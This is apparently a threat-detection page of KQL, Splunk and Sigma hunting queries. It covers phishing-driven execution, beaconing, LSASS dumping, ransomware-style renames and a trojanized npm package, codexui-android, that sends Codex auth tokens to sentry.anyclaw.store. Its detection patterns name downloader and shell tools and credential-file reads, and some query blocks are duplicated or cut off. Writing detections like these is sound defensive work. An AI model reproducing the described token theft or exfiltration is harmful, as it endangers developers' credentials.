| regex("(oracle|EBS|fs_inst|appsutil|FMW_Home|comn/util|Concurrent)", field=ParentImageFileName)
| ImageFileName=/\/(sh|bash|ksh|zsh|wget|curl|perl|python3?|nc|ncat)$|\\(cmd|powershell|pwsh|certutil)\.exe$/i
| NOT (regex("(adstrtal|adstpall|adcfgclone)", field=CommandLine))
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

| tstats `summariesonly` count

title: Office Application Spawning Script Host
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d07
status: experimental
description: |
    Word/Excel/Outlook/OneNote spawning powershell, cmd, wscript,
    cscript, mshta, rundll32, regsvr32 — classic macro / embedded-
    object payload signature.
references:
    - https://attack.mitre.org/techniques/T1059/
    - https://attack.mitre.org/techniques/T1566/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059
    - attack.t1566.001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\outlook.exe'
            - '\onenote.exe'
            - '\mspub.exe'
            - '\visio.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate automation macros in trusted internal documents
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
OAuth consent / suspicious app grant Actions on Objectives High

Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents

| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

description: |

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · PowerShell encoded / obfuscated command · Article-specific behavioural hunt — GPU mining malware spreads via SEO poisoning, AI chatbots
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Legitimate-Looking Codex Remote UI Secretly Steals Your AI Tokens

Aikido
2026-05-27 11 use cases 4 techniques 5 kill-chain phases detected

A polished Codex remote UI, the npm package codexui-android, has active development and thousands of weekly users. It has been quietly exfiltrating OpenAI auth tokens for the past month. Category: Vulnerabilities & Threats

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint · [LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Legitimate-Looking Codex Remote UI Secretly Steals Your AI Tokens
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) · [LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) · Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
[LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) Command & Control High
Hunts DNS resolution or outbound HTTPS to the attacker C2 anyclaw.store / sentry.anyclaw.store used by the trojanized codexui-android npm package and its companion Play Store apps to POST stolen Codex auth.json blobs to /startlog. Endpoint is deliberately named to blend with legitimate Sentry telemetry. Rationale: Domain sentry.anyclaw.store + path /startlog + User-Agent codexui/<ver> are unique strings from the article's exfil function. No legitimate use of anyclaw.store exists. Cross-checked: domain pattern matches Aikido's IOC publication and anyclaw.store appears as the only C2 host across both npm package and Android APK chains in the article. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1071.001 T1036.005 T1567
Data sourcesNetwork_Traffic.All_Traffic Web.Web
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ("sentry.anyclaw.store","anyclaw.store") or RemoteUrl endswith ".anyclaw.store"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, ActionType
| order by Timestamp desc
union isfuzzy=true
  (DnsEvents
    | where TimeGenerated > ago(30d)
    | where Name endswith "anyclaw.store"
    | project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode),
  (ImDnsActivity
    | where TimeGenerated > ago(30d)
    | where DnsQuery endswith "anyclaw.store"
    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, Name=DnsQuery, QueryType=DnsQueryTypeName, ResultCode=DnsResponseCodeName),
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationHostName endswith "anyclaw.store" or RequestURL has "anyclaw.store/startlog" or RequestClientApplication startswith "codexui/"
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, Name=DestinationHostName, RequestURL, RequestClientApplication)
| order by TimeGenerated desc

[LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint Delivery High
Hunts the installation vector for the supply-chain attack - npm or pnpm pulling codexui-android (any version >= 0.1.82) onto a developer workstation or CI runner. The published npm artifact contains the malicious chunk-PUR7OUAG.js that the GitHub source does not. Rationale: `codexui-android` is the literal article-specific package name; chunk-PUR7OUAG.js is the unique malicious entry-point chunk only present in the npm artifact (never committed to GitHub). Either string in a node-tooling command line on a developer host is high-fidelity for this supply-chain attack. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes Endpoint.Filesystem
union isfuzzy=true
  (DeviceProcessEvents
    | where Timestamp > ago(60d)
    | where (InitiatingProcessFileName in~ ("npm.exe","pnpm.exe","yarn.exe","node.exe") or FileName in~ ("npm.exe","pnpm.exe","yarn.exe"))
    | where ProcessCommandLine has "codexui-android" or InitiatingProcessCommandLine has "codexui-android"
    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath),
  (DeviceFileEvents
    | where Timestamp > ago(60d)
    | where FolderPath has "codexui-android" or FileName == "chunk-PUR7OUAG.js"
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, ProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine=InitiatingProcessCommandLine, FolderPath)
| order by Timestamp desc
union isfuzzy=true
  (SecurityEvent
    | where TimeGenerated > ago(60d)
    | where EventID == 4688
    | where (NewProcessName endswith "\\npm.exe" or NewProcessName endswith "\\pnpm.exe" or NewProcessName endswith "\\yarn.exe" or NewProcessName endswith "\\node.exe" or ParentProcessName endswith "\\npm.exe" or ParentProcessName endswith "\\pnpm.exe")
    | where CommandLine has "codexui-android"
    | project TimeGenerated, Computer, Account=SubjectUserName, NewProcessName, CommandLine, ParentProcessName),
  (ImProcessCreate

[LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) Actions on Objectives High
Hunts the credential-access primitive of the codexui-android malware - a node process whose module path lives under codexui-android/dist-cli/ opening the Codex OAuth token store at ~/.codex/auth.json or $CODEX_HOME/auth.json. This catches the file-read step regardless of whether C2 succeeds. Rationale: The article's exfil function explicitly resolves $CODEX_HOME/auth.json and reads the whole file. Filename auth.json + parent dir .codex + reader process node (or anything in a codexui-android path) is a tight, article-specific triple. Filtering on InitiatingProcessFolderPath containing codexui-android removes legitimate Codex CLI use. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1552.001 T1528 T1083

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, FolderPath, FileName, ActionType
| order by Timestamp desc

| where TargetFilePath has_any ("\\.codex\\","/.codex/")

[LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) Actions on Objectives High
Hunts the exact exfil request shape - HTTPS POST to path /startlog with User-Agent matching ^codexui/<version>. Catches the malware even if the C2 domain is changed but URL/UA conventions remain. Targets proxy/firewall layer-7 telemetry. Rationale: Path /startlog and User-Agent prefix codexui/ are hard-coded in the article's httpsRequest options block. The UA prefix in particular is a self-identifying string the attacker chose - no legitimate Sentry SDK or anything else uses it. Catches mirror domains / IP fallbacks if the attacker rotates infrastructure. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1041 T1071.001 T1573
Data sourcesWeb.Web Network_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "/startlog" or RemoteUrl has "anyclaw.store"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
union isfuzzy=true
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where RequestMethod =~ "POST"
    | where RequestURL has "/startlog" or DestinationHostName endswith "anyclaw.store" or RequestClientApplication startswith "codexui/"
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, RequestMethod, RequestURL, DestinationHostName, UserAgent=RequestClientApplication, DeviceVendor, DeviceProduct),
  (ImWebSession
    | where TimeGenerated > ago(30d)
    | where HttpMethod =~ "POST"
    | where Url has "/startlog" or HttpHostName endswith "anyclaw.store" or HttpRequestHeaderUserAgent startswith "codexui/"
